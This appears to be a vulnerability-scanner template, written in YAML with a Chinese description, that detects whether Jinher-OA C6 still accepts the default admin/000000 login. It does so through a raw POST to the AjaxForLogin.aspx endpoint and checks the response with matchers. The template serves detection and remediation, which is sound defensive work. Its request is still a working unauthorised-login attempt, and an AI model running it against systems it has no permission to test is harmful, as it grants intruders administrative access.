id: jinher-oa-default-login

info:
  name: Jinher-OA C6 默认管理员账户发现（弱口令）
  author: ritikchaddha
  severity: high
  description: |
    该模板用于检测 Jinher-OA C6 是否仍可使用默认凭据或弱口令登录。模板主要向 `/c6/Jhsoft.Web.login/AjaxForLogin.aspx` 等认证入口发送请求，使用内置默认凭据组合进行认证尝试，并根据响应中的 `ÏµÍ³¹ÜÀíÔ±|`、`ÄúºÃ|||` 等登录成功特征判断登录是否成功；命中说明目标未及时修改出厂、示例或初始化账号口令。
  impact: |
    - 攻击者可登录 Jinher-OA C6 后台，管理内容、用户、插件、主题、文件、表单或业务流程配置。
    - 后台权限被滥用后，可能导致页面篡改、恶意文件上传、敏感资料泄露，或进一步取得服务器执行能力。
  remediation: |
    - 立即修改默认管理员凭据，删除安装向导、演示账号和不必要的后台用户。
    - 限制后台登录入口访问来源，启用多因素认证、登录失败锁定和验证码等防护。
    - 检查近期内容、插件、主题、文件上传和管理员操作记录，确认没有持久化后门。
  reference:
    - https://github.com/nu0l/poc-wiki/blob/main/%E9%87%91%E5%92%8COA-C6-default-password.md
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
  tags: jinher,default-login,vuln

http:
  - raw:
      - |
        POST /c6/Jhsoft.Web.login/AjaxForLogin.aspx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        type=login&loginCode={{base64("{{username}}")}}&pwd={{base64("{{password}}")}}&

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - "000000"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "ÏµÍ³¹ÜÀíÔ±|"
          - "ÄúºÃ|||"
        condition: and

      - type: word
        part: header
        words:
          - "SessionIDAdmin="

      - type: status
        status:
          - 200
